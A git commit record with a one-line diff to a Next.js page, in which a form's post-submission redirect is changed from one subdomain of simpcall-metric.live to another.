2e31417fe1f81a0dde852e0fd73e8d0c304b6428
husknet <127146284+husknet@users.noreply.github.com>
2024-08-16 10:13:41 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://obito.simpcall-metric.live/';
+        window.location.href = 'https://ages.simpcall-metric.live/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
